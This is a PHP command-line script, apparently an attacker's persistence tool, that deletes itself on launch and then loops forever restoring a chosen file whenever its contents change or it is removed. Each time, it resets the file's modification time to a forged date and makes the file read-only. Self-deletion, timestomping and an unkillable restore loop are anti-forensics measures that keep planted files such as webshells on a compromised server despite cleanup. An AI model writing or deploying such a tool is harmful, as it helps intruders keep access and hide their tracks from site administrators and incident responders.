<?php
/**
 * 使用方法:
 * root@localhost#php lockfile.php 要加密的文件.php 暂停秒数 文件修改时间
 * php lockfile.php index.php 1 "2020-06-18 06:25:33"
 */
set_time_limit(0);
error_reporting(0);
//删除自己
unlink(__FILE__);
$filename = $argv[1];
$filetime = empty($argv[3]) ? date('Y-m-d H:i:s') : $argv[3];
$filetime = strtotime($filetime);

if(file_exists($filename)){
    $content = file_get_contents($filename);
    $filemd5 = md5_file($filename);
    do{
        if(is_dir($filename)){
            rmdir($filename);
        }
        if(is_file($filename)){
            if($filemd5 != md5_file($filename)){
	            chmod($filename, 0777);
	            file_put_contents($filename, $content, LOCK_EX);
	            /*尝试修改文件时间*/
	            touch($filename, $filetime);
	            chmod($filename, 0555);
            }
        }else{
        	file_put_contents($filename, $content, LOCK_EX);
          touch($filename, $filetime);
          chmod($filename, 0555);
        }
        sleep(is_numeric($argv[2])?$argv[2]:10);
    }while(true);
}
?>